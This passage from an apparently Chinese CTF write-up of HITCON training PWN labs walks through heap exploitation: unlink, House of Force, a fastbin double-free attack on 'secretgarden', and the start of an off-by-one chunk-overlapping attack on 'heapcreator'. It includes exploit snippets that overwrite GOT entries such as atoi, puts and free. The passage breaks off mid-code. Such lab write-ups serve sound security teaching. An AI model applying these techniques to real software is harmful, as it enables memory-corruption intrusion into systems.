onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KbXCStN5vZ49CBae6oM9cvjEiaJ2RRvsbnialmgg8gibKEdZYRxZNdMCSw/640?wx_fmt=png'" data-type="png" data-w="515" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption>溢出前</figcaption></figure><figure><img data-backh="548" data-backw="554" data-ratio="0.9891696750902527" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/54_qibOJDAuiaQ5uOPPkkcB4rtr6JUIrA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1Kk2gkf7cibxja4Ed2LdtYicoXBNwpqibOJDAuiaQ5uOPPkkcB4rtr6JUIrA/640?wx_fmt=png'" data-type="png" data-w="554" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption>溢出后</figcaption></figure><p>可以看到，伪造的chunk以及修改的prev_size and prev_inuse已经可以了。</p><p>接下来free chunk1后，chunk1就会与chunk0进行unlink操作。</p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.27923976608187134" data-s="300,640" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/55_sAtIT7GInic0J0LYpnsItdaI41gicQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K34IJf0NDSFdVllBZfL4ZOL20SpsAtIT7GInic0J0LYpnsItdaI41gicQ/640?wx_fmt=png'" data-type="png" data-w="684" style=""  /></p><p>此时，指针指向了chunk0-0x18处，接下来进行覆写。</p><p>因为我们的fake_FD是chunk0 – 0x18，所以我们修改chunk0即可。</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="ini"><code><span class="code-snippet_outer"><span class="code-snippet__attr">atoi_got</span> = elf.got[<span class="code-snippet__string">'atoi'</span>]</span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">payload</span>&nbsp;=&nbsp;p64(<span class="code-snippet__number">0</span>)&nbsp;+&nbsp;p64(<span class="code-snippet__number">0</span>)&nbsp;+&nbsp;p64(<span class="code-snippet__number">0</span>x80)&nbsp;+&nbsp;p64(fake_FD)&nbsp;+&nbsp;p64(<span class="code-snippet__number">0</span>x80)&nbsp;+&nbsp;p64(atoi_got)</span></code></pre></section><p><span style="font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">首先将chunk1改为atoi_got，然后将atoi_got的内容改为magic函数。</span><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer">atoi_got = elf.got['atoi']</span></code><code><span class="code-snippet_outer">payload = p64(0) + p64(0) + p64(0x80) + p64(fake_FD) + p64(0x80) + p64(atoi_got)</span></code><code><span class="code-snippet_outer">change(0,len(payload),payload)</span></code><code><span class="code-snippet_outer">payload = p64(magic)</span></code><code><span class="code-snippet_outer">change(1,len(payload),payload)</span></code></pre></section><figure><img data-ratio="0.25340599455040874" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/56_1KkpVPBRdKupoftaTYTia5kYgEiccw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KU7LwLFXG4jQgb2lT3b0lxUVNn11KkpVPBRdKupoftaTYTia5kYgEiccw/640?wx_fmt=png'" data-type="png" data-w="1468" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>get flag</figcaption></figure><h4>House of Force</h4><p>这个攻击方法大概就是通过溢出修改top chunk的size，然后我们就可以申请到top chunk。</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cs"><code><span class="code-snippet_outer"><span class="code-snippet__meta">###chunk overflow###</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">add</span>(<span class="code-snippet__number">0x88</span>,<span class="code-snippet__string">'aaaa'</span>)</span></code><code><span class="code-snippet_outer">payload = <span class="code-snippet__string">'A'</span> * <span class="code-snippet__number">0x80</span> + p64(<span class="code-snippet__number">0</span>) + p64(<span class="code-snippet__number">0xffffffffffffffff</span>)<span class="code-snippet__meta"># or -1</span></span></code><code><span class="code-snippet_outer">change(<span class="code-snippet__number">0</span>,len(payload),payload)</span></code></pre></section><p><span style="font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">这里利用了chunk的复用规则，并且上面说过了-1的事情。</span><br  /></p><p>通过HOF方法将top chunk申请到指定位置修改v3的指针。</p><figure><img data-ratio="0.42758620689655175" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/57_WwwVZuSyibAbiafEicuZlNTwBld0Bg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KCpqecWgu7NAgSIibBqkOmL555RWOWwwVZuSyibAbiafEicuZlNTwBld0Bg/640?wx_fmt=png'" data-type="png" data-w="725" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>目的是修改0x1a8d000处chunk的内容。</p><p>top距离它是(0x10+0x10) + (0x80 + 0x10)[目标chunk大小0x10加head大小0x10]</p><p>这么算的话，top chunk会转移到第一个chunk的位置，但是此时top chunk的头也就是存放函数chunk的头，再进行切割会从如图所示地方开始切割。作为chunk head达不到控制的目的，所以还需0x10额外作为top chunk的head。</p><figure><img data-ratio="0.45481049562682213" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/58_LccOThhTUd2icbvPJp5iaOBBfCrKWQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K9ASPgq7HVGJvt5dZkHXywXVq4jLccOThhTUd2icbvPJp5iaOBBfCrKWQ/640?wx_fmt=png'" data-type="png" data-w="686" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer"><span class="code-snippet__comment">###House of Force###</span></span></code><code><span class="code-snippet_outer">heap_base = -(0x80 + 0x10)-(0x10+0x10)</span></code><code><span class="code-snippet_outer">goal = heap_base - 0x10</span></code><code><span class="code-snippet_outer">add(goal,'top chunk!')</span></code><code><span class="code-snippet_outer">add(0x10,p64(magic)+p64(magic))</span></code></pre></section><figure><img data-ratio="0.3878020713463751" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/59_He7dwrcWNDEU790LoiaaZvDibAAcrg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K4A5VQprntuQbZU073vJtplkrzwHe7dwrcWNDEU790LoiaaZvDibAAcrg/640?wx_fmt=png'" data-type="png" data-w="869"  /></figure><p>此时如上图，从图示所示位置开始分配，就相当于重新分配到了原来的那个存放函数指针的chunk。</p><figure><img data-backh="277" data-backw="415" data-ratio="0.6674698795180722" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/60_4p190gQrawWZicACWsF3pOY2eE8s9Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KHtLFtRnnzJaFzzVOGB0FLxvc94p190gQrawWZicACWsF3pOY2eE8s9Q/640?wx_fmt=png'" data-type="png" data-w="415" style="width: 100%;height: auto;"  /></figure><p>成功修改了。</p><figure><img data-ratio="0.31624605678233436" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/61_SMV38NmewgBXQ5d4KPJhAPFiaqewjg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KD4ayDChMbr2jWtvbZNsgP8Im4SMV38NmewgBXQ5d4KPJhAPFiaqewjg/640?wx_fmt=png'" data-type="png" data-w="1268" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>get flag</figcaption></figure><p><br  /></p><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong>lab12-secretgarden</strong></span></h2><p><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></p><figure><img data-backh="235" data-backw="392" data-ratio="0.5994897959183674" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/62_T06h5QjNsK8yLfYCevqSpYzv74mthg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K0dZd7kDDZWJKiaBuX9600Kvc0T06h5QjNsK8yLfYCevqSpYzv74mthg/640?wx_fmt=png'" data-type="png" data-w="392" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption>menu</figcaption></figure><figure><img data-ratio="0.8866120218579235" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/63_qiczbcEmh59aPu1ucG8fB0xCgC1BuQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KpgbkWuUHEseXmXoKQG8HLbBY0qiczbcEmh59aPu1ucG8fB0xCgC1BuQ/640?wx_fmt=png'" data-type="png" data-w="732" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>add</figcaption></figure><p><br  /></p><p>长度好像没有限制，个数可以有0x63个。</p><figure><img data-ratio="0.6454388984509466" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/64_RZMjZ4E24GbBic9lBv2icF7GkhG0mQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K9ImTuAv5z27sIxjib10RN6V4OsURZMjZ4E24GbBic9lBv2icF7GkhG0mQ/640?wx_fmt=png'" data-type="png" data-w="581" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>del</figcaption></figure><p>将chunk的size清空，并free掉了chunk，并没有清空chunk。</p><figure><img data-ratio="0.4392523364485981" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/65_wewTy9wbCHmzD0CibZqXh3sG0pWT4w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KXdNzCSR6tKydjWMzLTtp2N8ib1wewTy9wbCHmzD0CibZqXh3sG0pWT4w/640?wx_fmt=png'" data-type="png" data-w="535" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>clean</figcaption></figure><p>遍历list并且free并且指针置0。</p><figure><img data-ratio="0.5742024965325936" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/66_DbHpPeSxFLvab6vHGibsJppsRIa3NA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KU5HwqGTVeFrJPUCuXOqopoXUoDbHpPeSxFLvab6vHGibsJppsRIa3NA/640?wx_fmt=png'" data-type="png" data-w="721" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>visit</figcaption></figure><p>循环遍历并输出list中的flower。</p><figure><img data-backh="211" data-backw="459" data-ratio="0.4596949891067538" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/67_R27HzFflcicuqNm315SXTDZicSkibQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1Ktha0JVxRJCKfXorEYo3BGJmVEsVR27HzFflcicuqNm315SXTDZicSkibQ/640?wx_fmt=png'" data-type="png" data-w="459" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption>magic</figcaption></figure><h3>leak libc</h3><p>其实可以泄露libc，但是因为给了magic函数所以不泄漏也没关系，现在走一遍泄露的流程。</p><figure><img data-ratio="0.21441281138790036" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/68_1ia88MwXcicDicyDum1S3yyMfnWLvw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KWichYweZVKLmyGnWYDZeF2VwJx7m1ia88MwXcicDicyDum1S3yyMfnWLvw/640?wx_fmt=png'" data-type="png" data-w="1124" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>unsorted bin</figcaption></figure><p>可以看到这里很正常的就是unsorted bin放到bin中。</p><figure><img data-ratio="0.32561851556264965" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/69_XA0reSNe0j5j9WNg3mJSHMkkbsykKA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K8HqhkXwGjWux0gFtibpic7luSibXA0reSNe0j5j9WNg3mJSHMkkbsykKA/640?wx_fmt=png'" data-type="png" data-w="1253" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>清空所有的chunk后再malloc回来就可以看到，main_arena+88还在chunk中。</p><p>但是新malloc的时候最好就输入一个a，因为会覆盖，输入一个a覆盖两位没关系，是不变的。</p><p>但是要clean才可以，还有另一种：</p><figure><img data-ratio="0.3353846153846154" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/70_p4FGkicduwu7f3YMIxLUu6FibzdnOg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KoDZhpsu1t6Xt9N6QiaICrd7hhDmp4FGkicduwu7f3YMIxLUu6FibzdnOg/640?wx_fmt=png'" data-type="png" data-w="975" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>这种delete后要交互式添加chunk…不然不成功。。。</p><h3>fastbin attack</h3><figure><img data-ratio="0.19507575757575757" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/71_SlbqSr5xX1ibl7HuuSNhT9peMspISw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KxpYVh1dtpVicTic0CZDIKM0CSJTSlbqSr5xX1ibl7HuuSNhT9peMspISw/640?wx_fmt=png'" data-type="png" data-w="1056" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>因为fastbin(LIFO)的free特性是检查第一个chunk，若要free的chunk和第一个一样则报错，如上图所示这样就不会出现问题。</p><p>再根据fastbin的分配特性，我们修改fd指针即可。</p><figure><img data-backh="139" data-backw="441" data-ratio="0.31519274376417233" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/72_IfXGE7EVesuKmsH4MIAo5wTA1HicDQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KBzHa1tukqH5hT7RlcMMW2xL43IfXGE7EVesuKmsH4MIAo5wTA1HicDQ/640?wx_fmt=png'" data-type="png" data-w="441" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /></figure><p>上图是它的保护机制。</p><figure><img data-ratio="0.290414878397711" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/73_N3dhstIAxXYwb0iaKoWK9yuRRFvSBw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KOjGQUOVibMqasPpvXWuNRSsVWzN3dhstIAxXYwb0iaKoWK9yuRRFvSBw/640?wx_fmt=png'" data-type="png" data-w="699" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>atoi_got</figcaption></figure><p>劫持got表，上图是atoi函数的got表，要找到一个合适的位置绕过malloc的检查。</p><figure><img data-ratio="0.31755725190839695" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/74_JtnfbiaQS3EaibyUhs194dMBSC2Qdw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KZvO8epCzaGMjRmAYqQJpiaPrRNlJtnfbiaQS3EaibyUhs194dMBSC2Qdw/640?wx_fmt=png'" data-type="png" data-w="655" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>这里看起来可以，前面0x8的prev_size，后面0x8的size。</p><p>看到上图60这个地方作为size刚好在fastbin范围内，60前面有0x5的0，所以要推后。</p><figure><img data-ratio="0.07027027027027027" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/75_8x0rOEZEjjnnNvT6L5MnTHK7MYkAzw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1Kl55UHY3NsKxVHRhpjpvHYyAd8x0rOEZEjjnnNvT6L5MnTHK7MYkAzw/640?wx_fmt=png'" data-type="png" data-w="555" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption><strong>0x60</strong><br style="box-sizing: inherit;"  />size字段的高四位可以不为0</figcaption></figure><p>上图所示60到了最后面，即是chunk的size位，后面我突然发现…0x602020的位置刚好是puts的got地址，所以方便起见我们就修改Puts的got表吧。</p><figure><img data-ratio="0.21212121212121213" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/76_lGUgE74VS0ly1uebY6oXmVEDpo2aSQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KrZgzYR7BfxwEbdlpVDEtXwc8lGUgE74VS0ly1uebY6oXmVEDpo2aSQ/640?wx_fmt=png'" data-type="png" data-w="1089" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>目标地址已经进入了fastbin。</p><p>要注意的是，我们size选的是0x60(包括chunk head)，所以如果目标在0x70(包括head)这条链上，若申请0x50的chunk不会申请到目标(用户申请的size不包括head)，若申请0x60则通不过malloc的检查。</p><p>就像我们劫持malloc_hook一样，一般找0x7f的size，但是申请的时候是申请0x60，具体原因参照glibc源代码。</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cs"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">add</span>(<span class="code-snippet__number">0x50</span>,<span class="code-snippet__string">'aaaa'</span>)<span class="code-snippet__meta">#0</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">add</span>(<span class="code-snippet__number">0x50</span>,<span class="code-snippet__string">'bbbb'</span>)<span class="code-snippet__meta">#1</span></span></code><code><span class="code-snippet_outer">delete(<span class="code-snippet__number">0</span>)</span></code><code><span class="code-snippet_outer">delete(<span class="code-snippet__number">1</span>)</span></code><code><span class="code-snippet_outer">delete(<span class="code-snippet__number">0</span>)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">add</span>(<span class="code-snippet__number">0x50</span>,p64(fake_chunk))</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">add</span>(<span class="code-snippet__number">0x50</span>,<span class="code-snippet__string">'cccc'</span>)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">add</span>(<span class="code-snippet__number">0x50</span>,<span class="code-snippet__string">'dddd'</span>)</span></code><code><span class="code-snippet_outer">payload = <span class="code-snippet__string">'A'</span> * (puts_got - fake_chunk - <span class="code-snippet__number">0x10</span>) + p64(magic)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">add</span>(<span class="code-snippet__number">0x50</span>,payload)</span></code></pre></section><figure><img data-ratio="0.3148558758314856" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/77_2WKDk2Ub6JOXFQUxLTwAWWL9j1IIIA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K6d1NVKibJasjO5nlXuqYW51jI2WKDk2Ub6JOXFQUxLTwAWWL9j1IIIA/640?wx_fmt=png'" data-type="png" data-w="1353" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><strong>总结：</strong></p><p>我总结到了一个关键的地方就是，利用fastbin attack(不管是配合UAF还是double free)时，要根据我们自己能找到符合条件的size来根据这个size创建chunk，不然不是通不过检查就是分配不到。</p><p>当然我觉得可以通过泄露libc寻找gadgets然后劫持__malloc_hook来直接getshell，就不用这么麻烦地去找符合条件的size。</p><p><br  /></p><p><br  /></p><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong>lab13 heapcreator</strong></span></h2><p><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></p><h3>Analysis</h3><figure><img data-ratio="1.0479233226837061" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/78_p5jVHvgKC30nmxFNX4ADoUSLXibbVw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KibITbVJxC5p37SCCderIoddicq7p5jVHvgKC30nmxFNX4ADoUSLXibbVw/640?wx_fmt=png'" data-type="png" data-w="626" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>main</figcaption></figure><p>根据菜单可以看到，有create、edit、show、delete四个主要功能函数。</p><p><br  /></p><figure><img data-ratio="0.9102362204724409" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/79_B20lEly7rNtHWeibnRrANiciajLNFQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KmUsJJ3376qibMtwaaicv3kzcmbCpLB20lEly7rNtHWeibnRrANiciajLNFQ/640?wx_fmt=png'" data-type="png" data-w="635"  /><figcaption>create</figcaption></figure><p>先看create，最多可以创建10个heap，全部由数组heaparray管理，每个heap会有一个0x10的chunk来存放heap的指针及大小。</p><p>size可以自定义。</p><figure><img data-ratio="0.6703821656050956" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/80_x6JHoOsjmdyS09LWZOIpib96Sxu4tA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K0Hgo37EXnExe8zra08OX41H5Zx6JHoOsjmdyS09LWZOIpib96Sxu4tA/640?wx_fmt=png'" data-type="png" data-w="628"  /><figcaption>edit</figcaption></figure><p>注意read_input这里，heaparray[v1]是存放size的，所以这里存在一个off-by-one。</p><figure><img data-ratio="0.528" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/81_OCphiccOZ4csd3Xfn0HZiagPIzD6KQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KvhymJAQjLcIGalxWJNTn9VkHWFOCphiccOZ4csd3Xfn0HZiagPIzD6KQ/640?wx_fmt=png'" data-type="png" data-w="750" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>show</figcaption></figure><p>常规打印。</p><figure><img data-ratio="0.8923395445134575" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/82_QRYGBY2D8bJh1IHUEOmOMzELXmJ3tg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KdBQjmf3I6zYCgO0NaNhyulbwQRYGBY2D8bJh1IHUEOmOMzELXmJ3tg/640?wx_fmt=png'" data-type="png" data-w="483"  /><figcaption>delete</figcaption></figure><p>free并将指针置空了。</p><h3>How to exploit</h3><p>首先，size可控，其次，存在off_by_one，最重要的是，chunk中存有指针。</p><figure><img data-ratio="0.48657187993680884" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/83_A9YuIpibGkwYMKfibEdkZlicMrAr9w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KL3QJfEJPSuh99e1iagPW0BVzYfcmA9YuIpibGkwYMKfibEdkZlicMrAr9w/640?wx_fmt=png'" data-type="png" data-w="633" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>这是create了一个0x80大小的heap，0x10的chunk中包含了heap的指针，所以我们可以通过chunk overlapping将其可控。</p><figure><img data-ratio="1.1630434782608696" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/84_aiapAm0lxsa9BTQYTHaBnZ7yBk9vHg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KvblvUKL9MwoBEAqvlFNaxbAYTiaiapAm0lxsa9BTQYTHaBnZ7yBk9vHg/640?wx_fmt=png'" data-type="png" data-w="736" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>有的人会问，为什么不直接修改chunk2中的指针呢？</p><p>因为我们重新申请的时候chunk2实际上已经是heap了，而show中打印的是chunk的指针。</p><h3>Start to exploit</h3><figure><img data-ratio="0.3092105263157895" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/85_v4hGRfVYdLiaVDcrYLtdEs0ImkcamA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1Kjwx8Cb07Q7QpPrgoicdYdGB5Bzv4hGRfVYdLiaVDcrYLtdEs0ImkcamA/640?wx_fmt=png'" data-type="png" data-w="608" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>heap1和heap2大小为0x10，chunk1和chunk2大小也是0x10，加上head一共是0x81。</p><p>可以看到chunk1已经被放到了0x80的链上面。</p><figure><img data-ratio="0.302491103202847" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/86_YqbELnIx3U26W2bW2MicqHN6oVfkbQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KIibBrI0L0Bia6iaFUibtoTBNIPQrAYqbELnIx3U26W2bW2MicqHN6oVfkbQ/640?wx_fmt=png'" data-type="png" data-w="562" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>我们的目标就是覆盖标红的指针。</p><figure><img data-ratio="0.34840871021775544" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/87_aYXoEG1fL0VRj2XK7icdLXylicTxbA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KHeU7IFBDF1vX8xHu4yGt7KbjaJaYXoEG1fL0VRj2XK7icdLXylicTxbA/640?wx_fmt=png'" data-type="png" data-w="597"  /></figure><p>覆盖成功，需要注意，第一个红框存放的是heap2的大小，此时系统会认为heap2是在602018(free_got)这个地方，大小是0x10，因为要修改free_got指向system，所以size不能随意覆盖。</p><figure><img data-backh="243" data-backw="423" data-ratio="0.574468085106383" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/88_MfojLRZvshGVQkqJAoJfibD8EduURg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KdwATuKpJVtArEUlqFV0UsnuX2MfojLRZvshGVQkqJAoJfibD8EduURg/640?wx_fmt=png'" data-type="png" data-w="423" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /></figure><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer"><span class="code-snippet__comment">###leak libc###</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">create</span>(<span class="code-snippet__number">0x18</span>,<span class="code-snippet__string">'aaaa'</span>)<span class="code-snippet__comment">#0</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">create</span>(<span 